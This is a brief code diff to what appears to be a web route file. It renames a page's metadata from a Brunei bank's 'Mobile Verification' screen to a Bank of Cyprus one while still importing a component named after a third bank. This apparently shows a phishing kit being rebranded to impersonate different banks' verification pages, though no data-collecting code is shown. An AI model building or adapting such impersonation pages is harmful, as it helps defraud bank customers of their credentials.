@@ -1,8 +1,8 @@
 import BbvaPage from "../page"
 
 export const metadata = {
-  title: "BIBD — Mobile Verification",
-  description: "Bank Islam Brunei Darussalam Mobile Banking",
+  title: "Bank of Cyprus — Mobile Verification",
+  description: "Bank of Cyprus Mobile Banking",
 }
 
 export default function PhoneRoutePage() {
